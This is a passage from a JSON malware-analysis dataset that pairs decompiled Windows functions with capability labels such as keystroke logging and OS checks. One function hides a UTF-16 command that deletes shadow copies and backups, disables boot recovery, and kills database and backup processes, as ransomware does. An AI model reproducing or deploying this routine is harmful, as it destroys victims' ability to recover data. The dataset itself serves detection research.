        "decompiled_code": "\nint32_t __cdecl fcn.0040ca70(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t arg_8h_00;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040a3d0(arg_ch, arg_10h);\n    if (iVar1 < 0) {\n        return -10;\n    }\n    var_10h = 1;\n    var_ch = 0;\n    var_8h = 0;\n    if (arg_8h == arg_10h) {\n        var_4h = fcn.0040a590(&var_10h, arg_10h);\n        iVar1 = var_8h;\n        if (var_4h != 0) goto code_r0x0040cb1c;\n        arg_10h = &var_10h;\n    }\n    iVar1 = var_8h;\n    if (arg_8h != arg_ch) {\n        var_4h = fcn.0040a590(arg_8h, arg_ch);\n        if (var_4h != 0) goto code_r0x0040cb1c;\n    }\n    *arg_8h = 1;\n    arg_8h_00 = arg_10h[1];\n    var_4h = 0;\n    if (arg_8h_00 != 0) {\n        piVar2 = arg_10h[2] + arg_8h_00 * 4;\n        do {\n            piVar2 = piVar2 + -1;\n            if (*piVar2 != 0) break;\n            arg_8h_00 = arg_8h_00 + -1;\n        } while (arg_8h_00 != 0);\n    }\n    fcn.0040d670(arg_8h_00, arg_10h[2], arg_8h[2]);\ncode_r0x0040cb1c:\n    if (iVar1 != 0) {\n        fcn.0040ef10(iVar1, var_ch << 2);\n        sub.msvcrt.dll_free(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 525
    },
    "0040ccd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ccd0(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    if ((arg_ch != NULL) && (arg_ch = arg_8h + arg_ch + -1,  arg_8h <= arg_ch)) {\n        do {\n            uVar5 = *arg_8h;\n            uVar7 = 0;\n            cVar1 = '\\0';\n            iVar6 = 4;\n            do {\n                iVar8 = iVar6;\n                uVar4 = uVar5 & 0xff;\n                uVar3 = 0x18 - cVar1;\n                uVar5 = uVar5 >> 8;\n                cVar1 = cVar1 + '\\b';\n                uVar7 = uVar7 | uVar4 << (uVar3 & 0x1f);\n                iVar6 = iVar8 + -1;\n            } while (iVar6 != 0);\n            uVar4 = 0;\n            iVar8 = iVar8 + 3;\n            uVar5 = *arg_ch;\n            do {\n                uVar2 = uVar5 & 0xff;\n                cVar1 = iVar6;\n                uVar5 = uVar5 >> 8;\n                iVar6 = iVar6 + 8;\n                uVar4 = uVar4 | uVar2 << (0x18U - cVar1 & 0x1f);\n                iVar8 = iVar8 + -1;\n            } while (iVar8 != 0);\n            *arg_8h = uVar4;\n            arg_8h = arg_8h + 1;\n            *arg_ch = uVar7;\n            arg_ch = arg_ch + -1;\n        } while (arg_8h <= arg_ch);\n    }\n    return;\n}\n",
        "token_count": 456
    },
    "0040480f": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404830)\n// WARNING: Removing unreachable block (ram,0x00404820)\n// WARNING: Removing unreachable block (ram,0x00404814)\n\nulong fcn.0040480f(void)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    \n    puVar1 = cpuid(0x80000000);\n    uVar3 = *puVar1;\n    uVar4 = puVar1[2];\n    if (5 < uVar3) {\n        iVar2 = cpuid(0x80000005);\n        *(unaff_ESI + 4) = (*(iVar2 + 0xc) >> 0x18) << 10;\n        iVar2 = cpuid(0x80000006);\n        uVar4 = *(iVar2 + 8);\n        *(unaff_ESI + 8) = (*(iVar2 + 0xc) >> 0x10) << 10;\n        *(unaff_ESI + 0xc) = (uVar4 >> 0x12) << 0x13;\n        uVar3 = *(unaff_ESI + 4);\n    }\n    return CONCAT44(uVar4, uVar3);\n}\n",
        "token_count": 297
    },
    "00404a00": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.00404a00(void)\n\n{\n    uint uVar1;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    int32_t iStack8;\n    \n    iStack8 = 0;\n    uStack12 = 0;\n    uStack16 = 0;\n    fcn.00404ac0(&iStack8, &uStack12, &uStack16);\n    uVar1 = 0;\n    if (iStack8 == 1) {\n        if ((((5 < uStack12) && (uStack12 != 0xf)) && (0x19 < uStack16)) && (uStack16 != 0x1c)) {\n            uVar1 = 2;\n        }\n    }\n    else if (iStack8 == 2) {\n        if ((0xf < uStack12) && (uStack12 != 0x16)) {\n            uVar1 = 2;\n        }\n    }\n    else if (iStack8 == 3) {\n        if (0xf < uStack12) {\n            uVar1 = 1;\n        }\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 264
    },
    "00404a5b": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.00404a5b(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    int32_t iStack4;\n    \n    iStack4 = 0x404a60;\n    uVar1 = fcn.00404850();\n    if (10 < uVar1) {\n        iStack4 = 0;\n        uStack8 = 0;\n        uStack12 = 0;\n        fcn.00404ac0(&stack0xfffffffc, &stack0xfffffff8, &stack0xfffffff4);\n        if (iStack4 != 1) {\n            if (iStack4 == 2) {\n                if (0x15 < uStack8) {\n                    return 2;\n                }\n                if (uStack12 < 5) {\n                    return 0;\n                }\n            }\n            return 1;\n        }\n        if ((uStack8 != 6) || (0x3a < uStack12)) {\n            return 2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 237
    },
    "004046d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t fcn.004046d0(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    int32_t iStack20;\n    \n    if (*0x4155e8 != 1) {\n        puStack32 = &stack0xffffffec;\n        iStack20 = 0;\n        uStack24 = 0;\n        uStack28 = 0;\n        fcn.00404ac0();\n        bVar2 = 0xfffffff3 < &stack0xffffffe0;\n        if (iStack20 == 1) {\n            iStack20 = 0x404717;\n            fcn.00404752();\n            if (bVar2) {\n                iStack20 = 0x40471e;\n                fcn.004047ba();\n            }\n        }\n        else if ((iStack20 == 2) || (iStack20 == 3)) {\n            iStack20 = 0x404725;\n            fcn.0040480f();\n        }\n        else {\n            iStack20 = 0x404702;\n            fcn.00404752();\n            if (bVar2) {\n                iStack20 = 0x404709;\n                fcn.0040480f();\n                if (bVar2) {\n                    iStack20 = 0x404710;\n                    fcn.004047ba();\n                }\n            }\n        }\n    }\n    iVar1 = 0;\n    if (param_1 < 5) {\n        if (param_1 == 0) {\n            iVar1 = *0x4155f4;\n            if ((*0x4155f4 == 0) && (iVar1 = *0x4155f0,  *0x4155f0 == 0)) {\n                iVar1 = *0x4155ec;\n            }\n        }\n        else {\n            iVar1 = *(param_1 * 4 + 0x4155e8);\n        }\n        *0x4155e8 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 466
    },
    "004047ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004047ca)\n// WARNING: Removing unreachable block (ram,0x004047bc)\n\nulong fcn.004047ba(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_ESI;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    uint32_t uStack4;\n    \n    puVar1 = cpuid_basic_info(0);\n    uVar2 = *puVar1;\n    uVar4 = puVar1[2];\n    if (1 < uVar2) {\n        puVar1 = cpuid_cache_tlb_info(2);\n        uStack4 = *puVar1 & 0xffffff00;\n        uStack8 = puVar1[1];\n        uStack12 = puVar1[3];\n        uStack16 = puVar1[2];\n        uVar4 = 0xf;\n        do {\n            uVar2 = *(&uStack16 + uVar4);\n            iVar5 = 0x3c;\n            do {\n                if (uVar2 == *(unaff_ESI + 0x14 + iVar5 * 4)) {\n                    uVar2 = *(unaff_ESI + 0x16 + iVar5 * 4) << (*(unaff_ESI + 0x17 + iVar5 * 4) & 0x1f);\n                    uVar3 = *(unaff_ESI + 0x15 + iVar5 * 4);\n                    if (uVar3 < 4) {\n                        *(unaff_ESI + uVar3 * 4) = uVar2;\n                    }\n                }\n                iVar5 = iVar5 + -1;\n            } while (-1 < iVar5);\n            uVar4 = uVar4 - 1;\n        } while (-1 < uVar4);\n        uVar2 = *(unaff_ESI + 4);\n    }\n    return CONCAT44(uVar4, uVar2);\n}\n",
        "token_count": 466
    },
    "004050f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004050f0(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_4b0h;\n    uint var_4ach;\n    uint dwProcessId;\n    uint lpString1;\n    uint pExecInfo;\n    uint var_384h;\n    uint var_380h;\n    uint *var_37ch;\n    uint *var_378h;\n    uint *var_374h;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uint var_34ch;\n    uint uStack844;\n    uint uStack840;\n    uint uStack836;\n    uint var_33ch;\n    uint *var_338h;\n    uint *var_334h;\n    uint *var_330h;\n    uint *var_32ch;\n    uint *var_328h;\n    uint *var_324h;\n    uint *var_320h;\n    uint *var_31ch;\n    uint *var_318h;\n    uint *var_314h;\n    uint *var_310h;\n    uint *var_30ch;\n    uint *var_308h;\n    uint *var_304h;\n    uint *var_300h;\n    uint *var_2fch;\n    uint *var_2f8h;\n    uint *var_2f4h;\n    uint *var_2f0h;\n    uint *var_2ech;\n    uint *var_2e8h;\n    uint *var_2e4h;\n    uint *var_2e0h;\n    uint *var_2dch;\n    uint *var_2d8h;\n    uint *var_2d4h;\n    uint *var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    pcVar3 = _sym.imp.KERNEL32.dll_IsWow64Process;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    var_138h = 0x6d0063;\n    var_134h = 0x2e0064;\n    var_130h = 0x780065;\n    var_12ch = 0x65;\n    var_128h = 0x750072;\n    var_124h = 0x61006e;\n    var_120h = 0x73;\n    var_2c8h = 0x63002f;\n    var_2c4h = 0x760020;\n    var_2c0h = 0x730073;\n    var_2bch = 0x640061;\n    var_2b8h = 0x69006d;\n    var_2b4h = 0x20006e;\n    var_2b0h = 0x650064;\n    var_2ach = 0x65006c;\n    var_2a8h = 0x650074;\n    var_2a4h = 0x730020;\n    var_2a0h = 0x610068;\n    var_29ch = 0x6f0064;\n    var_298h = 0x730077;\n    var_294h = 0x2f0020;\n    var_290h = 0x6c0061;\n    var_28ch = 0x20006c;\n    var_288h = 0x71002f;\n    var_284h = 0x690075;\n    var_280h = 0x740065;\n    var_27ch = 0x260020;\n    var_278h = 0x770020;\n    var_274h = 0x69006d;\n    var_270h = 0x200063;\n    var_26ch = 0x680073;\n    var_268h = 0x640061;\n    var_264h = 0x77006f;\n    var_260h = 0x6f0063;\n    var_25ch = 0x790070;\n    var_258h = 0x640020;\n    var_254h = 0x6c0065;\n    var_250h = 0x740065;\n    var_24ch = 0x200065;\n    var_248h = 0x200026;\n    var_244h = 0x630062;\n    var_240h = 0x650064;\n    var_23ch = 0x690064;\n    var_238h = 0x200074;\n    var_234h = 0x73002f;\n    var_230h = 0x740065;\n    var_22ch = 0x7b0020;\n    var_228h = 0x650064;\n    var_224h = 0x610066;\n    var_220h = 0x6c0075;\n    var_21ch = 0x7d0074;\n    var_218h = 0x620020;\n    var_214h = 0x6f006f;\n    var_210h = 0x730074;\n    var_20ch = 0x610074;\n    var_208h = 0x750074;\n    var_204h = 0x700073;\n    var_200h = 0x6c006f;\n    var_1fch = 0x630069;\n    var_1f8h = 0x200079;\n    var_1f4h = 0x670069;\n    var_1f0h = 0x6f006e;\n    var_1ech = 0x650072;\n    var_1e8h = 0x6c0061;\n    var_1e4h = 0x66006c;\n    var_1e0h = 0x690061;\n    var_1dch = 0x75006c;\n    var_1d8h = 0x650072;\n    var_1d4h = 0x200073;\n    var_1d0h = 0x200026;\n    var_1cch = 0x630062;\n    var_1c8h = 0x650064;\n    var_1c4h = 0x690064;\n    var_1c0h = 0x200074;\n    var_1bch = 0x73002f;\n    var_1b8h = 0x740065;\n    var_1b4h = 0x7b0020;\n    var_1b0h = 0x650064;\n    var_1ach = 0x610066;\n    var_1a8h = 0x6c0075;\n    var_1a4h = 0x7d0074;\n    var_1a0h = 0x720020;\n    var_19ch = 0x630065;\n    var_198h = 0x76006f;\n    var_194h = 0x720065;\n    var_190h = 0x650079;\n    var_18ch = 0x61006e;\n    var_188h = 0x6c0062;\n    var_184h = 0x640065;\n    var_180h = 0x6e0020;\n    var_17ch = 0x20006f;\n    var_178h = 0x200026;\n    var_174h = 0x620077;\n    var_170h = 0x640061;\n    var_16ch = 0x69006d;\n    var_168h = 0x20006e;\n    var_164h = 0x650064;\n    var_160h = 0x65006c;\n    var_15ch = 0x650074;\n    var_158h = 0x630020;\n    var_154h = 0x740061;\n    var_150h = 0x6c0061;\n    var_14ch = 0x67006f;\n    var_148h = 0x2d0020;\n    var_144h = 0x750071;\n    var_140h = 0x650069;\n    var_13ch = 0x74;\n    var_11ch = 0;\n    var_4h = 0;\n    if ((_sym.imp.KERNEL32.dll_IsWow64Process != NULL) &&\n       ((*_sym.imp.KERNEL32.dll_IsWow64Process)(0xffffffff, &var_4h),  var_4h != 0)) {\n        uVar4 = (*pcVar2)(0x4111d0, \"Wow64DisableWow64FsRedirection\");\n        pcVar5 = (*pcVar6)(uVar4);\n        (*pcVar5)(&var_11ch);\n    }\n    var_37ch = &var_128h;\n    pExecInfo = 0x3c;\n    var_378h = &var_138h;\n    var_374h = &var_2c8h;\n    var_384h = 0;\n    var_380h = 0;\n    var_370h = 0;\n    var_36ch = 0;\n    var_368h = 0;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    (*_sym.imp.KERNEL32.dll_Sleep)(3000);\n    var_4h = 0;\n    if ((pcVar3 != NULL) && ((*pcVar3)(0xffffffff, &var_4h),  var_4h != 0)) {\n        uVar4 = (*pcVar2)(\"kernel32.dll\", \"Wow64RevertWow64FsRedirection\");\n        pcVar6 = (*pcVar6)(uVar4);\n        (*pcVar6)(var_11ch);\n    }\n    fcn.00401000(&var_4ach, 0, 0x124);\n    var_4b0h = 0x128;\n    var_4h = sub.KERNEL32.dll_CreateToolhelp32Snapshot(2, 0);\n    sub.KERNEL32.dll_Process32First(var_4h, &var_4b0h);\n    var_7ch = 0x65537877;\n    var_78h = 0x72657672;\n    var_74h._0_1_ = 0;\n    var_f8h = 0x65537877;\n    var_f4h = 0x72657672;\n    var_f0h = 0x77656956;\n    var_ech._0_1_ = 0;\n    var_88h = 0x736c7173;\n    var_84h = 0x72767265;\n    var_80h._0_1_ = 0;\n    var_14h = 0x75674152;\n    var_10h._0_2_ = 0x69;\n    var_ach = 0x65707573;\n    var_a8h = 0x73697672;\n    var_a4h._0_2_ = 0x65;\n    var_4ch = 0x746c7543;\n    var_48h = 0x657275;\n    var_54h = 0x73565452;\n    var_50h = 0x6e6163;\n    var_94h = 0x77666544;\n    var_90h = 0x68637461;\n    var_8ch._0_1_ = 0;\n    var_dch = 0x626c7173;\n    var_d8h = 0x73776f72;\n    var_d4h._0_2_ = 0x7265;\n    var_d4h._2_1_ = 0;\n    var_5ch = 0x776e6977;\n    var_58h = 0x64726f;\n    var_1ch = 0x33574251;\n    var_18h._0_2_ = 0x32;\n    var_64h = 0x42444251;\n    var_60h = 0x72674d;\n    var_a0h = 0x70756271;\n    var_9ch = 0x65746164;\n    var_98h._0_1_ = 0;\n    var_34ch = str.QBCFMonitorServiSeDebugPrivilege._0_4_;\n    uStack844 = str.QBCFMonitorServiSeDebugPrivilege._4_4_;\n    uStack840 = str.QBCFMonitorServiSeDebugPrivilege._8_4_;\n    uStack836 = str.QBCFMonitorServiSeDebugPrivilege._12_4_;\n    var_33ch._0_2_ = 0x6563;\n    var_33ch._2_1_ = 0;\n    var_b8h = 0x626c7861;\n    var_b4h = 0x67646972;\n    var_b0h._0_2_ = 0x65;\n    var_108h = 0x44494251;\n    var_104h = 0x72655350;\n    var_100h = 0x65636976;\n    var_fch._0_1_ = 0;\n    var_24h = 0x70747468;\n    var_20h._0_2_ = 100;\n    var_e8h = 0x616c6466;\n    var_e4h = 0x68636e75;\n    var_e0h._0_2_ = 0x7265;\n    var_e0h._2_1_ = 0;\n    var_70h = 0x7444734d;\n    var_6ch = 0x72767253;\n    var_68h._0_1_ = 0;\n    var_44h = 0x636d6f74;\n    var_40h = 0x367461;\n    var_ch = 0x6176616a;\n    var_8h._0_1_ = 0;\n    var_2ch = 0x73303633;\n    var_28h._0_2_ = 0x65;\n    var_c4h = 0x64303633;\n    var_c0h = 0x6f74636f;\n    var_bch._0_2_ = 0x72;\n    var_d0h = 0x77736477;\n    var_338h = &var_7ch;\n    var_334h = &var_f8h;\n    var_330h = &var_88h;\n    var_32ch = &var_14h;\n    var_328h = &var_ach;\n    var_324h = &var_4ch;\n    var_320h = &var_54h;\n    var_31ch = &var_94h;\n    var_318h = &var_dch;\n    var_314h = &var_5ch;\n    var_310h = &var_1ch;\n    var_30ch = &var_64h;\n    var_308h = &var_a0h;\n    var_304h = &var_34ch;\n    var_300h = &var_b8h;\n    var_2fch = &var_108h;\n    var_2f8h = &var_24h;\n    var_2f4h = &var_e8h;\n    var_2f0h = &var_70h;\n    var_2ech = &var_44h;\n    var_2e8h = &var_ch;\n    var_2e4h = &var_2ch;\n    var_2e0h = &var_c4h;\n    var_2dch = &var_d0h;\n    var_2d8h = &var_34h;\n    var_2d4h = &var_3ch;\n    var_2d0h = &var_118h;\n    var_cch = 0x66617366;\n    var_c8h._0_2_ = 0x65;\n    var_34h = 0x6f686466;\n    var_30h._0_2_ = 0x7473;\n    var_30h._2_1_ = 0;\n    var_3ch = 0x63734447;\n    var_38h._0_2_ = 0x6e61;\n    var_38h._2_1_ = 0;\n    var_118h = 0x4475685a;\n    var_114h = 0x46676e6f;\n    var_110h = 0x59676e61;\n    var_10ch._0_2_ = 0x75;\n    var_2cch = 0;\n    pcVar6 = _sym.imp.KERNEL32.dll_CloseHandle;\n    do {\n        (*_sym.imp.SHLWAPI.dll_PathRemoveExtensionA)(&lpString1);\n        iVar8 = 0;\n        do {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(&lpString1, (&var_338h)[iVar8]);\n            if ((iVar7 == 0) &&\n               (iVar7 = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, dwProcessId), \n               pcVar6 = _sym.imp.KERNEL32.dll_CloseHandle,  iVar7 != 0)) {\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar7, 0);\n                pcVar6 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n            }\n            uVar4 = var_4h;\n            piVar1 = &var_334h + iVar8;\n            iVar8 = iVar8 + 1;\n        } while (*piVar1 != 0);\n        iVar8 = sub.KERNEL32.dll_Process32Next(var_4h, &var_4b0h);\n    } while (iVar8 != 0);\n    (*pcVar6)(uVar4);\n    return;\n}\n",
        "token_count": 5406
    },
    "00406c90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406dc5)\n// WARNING: Removing unreachable block (ram,0x00406d51)\n// WARNING: Removing unreachable block (ram,0x00406d19)\n// WARNING: Removing unreachable block (ram,0x00406ca1)\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406c90(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    bool bVar3;\n    bool bVar4;\n    code *pcVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint lpSystemInfo;\n    uint32_t var_28h;\n    uint lpSystemTime;\n    uint var_14h;\n    uint var_10h;\n    ushort var_ch;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    piVar1 = cpuid_basic_info(0);\n    if (0 < *piVar1) {\n        bVar3 = true;\n        bVar4 = true;\n        if (((piVar1[1] != 0x756e6547) || (piVar1[2] != 0x49656e69)) || (piVar1[3] != 0x6c65746e)) {\n            bVar3 = false;\n        }\n        if (((piVar1[1] != 0x68747541) || (piVar1[2] != 0x69746e65)) || (piVar1[3] != 0x444d4163)) {\n            bVar4 = false;\n        }\n        if (((bVar3) || (bVar4)) && (iVar8 = cpuid_Version_info(1),  (*(iVar8 + 0xc) >> 0x10 & 0x200) != 0)) {\n            *0x416020 = 1;\n        }\n    }\n    puVar2 = cpuid_basic_info(0);\n    lpSystemTime = *puVar2;\n    iVar11 = puVar2[1];\n    iVar10 = puVar2[2];\n    iVar8 = puVar2[3];\n    var_14h._0_2_ = iVar11;\n    var_14h._2_2_ = iVar11 >> 0x10;\n    var_10h._0_2_ = iVar8;\n    var_10h._2_2_ = iVar8 >> 0x10;\n    bVar3 = true;\n    var_ch = iVar10;\n    var_ah._0_2_ = iVar10 >> 0x10;\n    bVar4 = true;\n    if (((iVar11 != 0x756e6547) || (iVar10 != 0x49656e69)) || (iVar8 != 0x6c65746e)) {\n        bVar3 = false;\n    }\n    if (((iVar11 != 0x68747541) || (iVar10 != 0x69746e65)) || (iVar8 != 0x444d4163)) {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        puVar2 = cpuid_Version_info(1);\n        lpSystemTime = *puVar2;\n        uVar9 = puVar2[3];\n        var_14h._0_2_ = puVar2[1];\n        var_14h._2_2_ = puVar2[1] >> 0x10;\n        var_10h._0_2_ = uVar9;\n        var_10h._2_2_ = uVar9 >> 0x10;\n        var_ch = puVar2[2];\n        var_ah._0_2_ = puVar2[2] >> 0x10;\n        if ((uVar9 & 0x40000000) != 0) {\n            *0x416024 = 1;\n        }\n    }\n    fcn.00406ec0();\n    (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n    *0x416028 = var_28h * 2;\n    *0x415718 = (*_sym.imp.KERNEL32.dll_CreateIoCompletionPort)(0xffffffff, 0, 0, *0x416028);\n    var_4h = 0;\n    if (var_28h != 0) {\n        do {\n            pcVar5 = _sym.imp.KERNEL32.dll_CreateThread;\n            uVar6 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x405f10, 0, 0, &var_ah + 2);\n            uVar7 = (*pcVar5)(0, 0, 0x405f10, 0, 0, &var_ah + 2);\n            pcVar5 = _sym.imp.KERNEL32.dll_SetThreadAffinityMask;\n            iVar8 = 1 << (var_4h & 0x1f);\n            (*_sym.imp.KERNEL32.dll_SetThreadAffinityMask)(uVar6, iVar8);\n            (*pcVar5)(uVar7, iVar8);\n            var_4h = var_4h + 1;\n        } while (var_4h < var_28h);\n    }\n    lpSystemTime = 0x107d0;\n    var_14h._2_2_ = 1;\n    var_10h._0_2_ = 1;\n    var_10h._2_2_ = 1;\n    var_ch = 1;\n    var_14h._0_2_ = 1;\n    var_ah._0_2_ = 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, 0x4157cc);\n    return 1;\n}\n",
        "token_count": 1303
    },
    "00407120": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
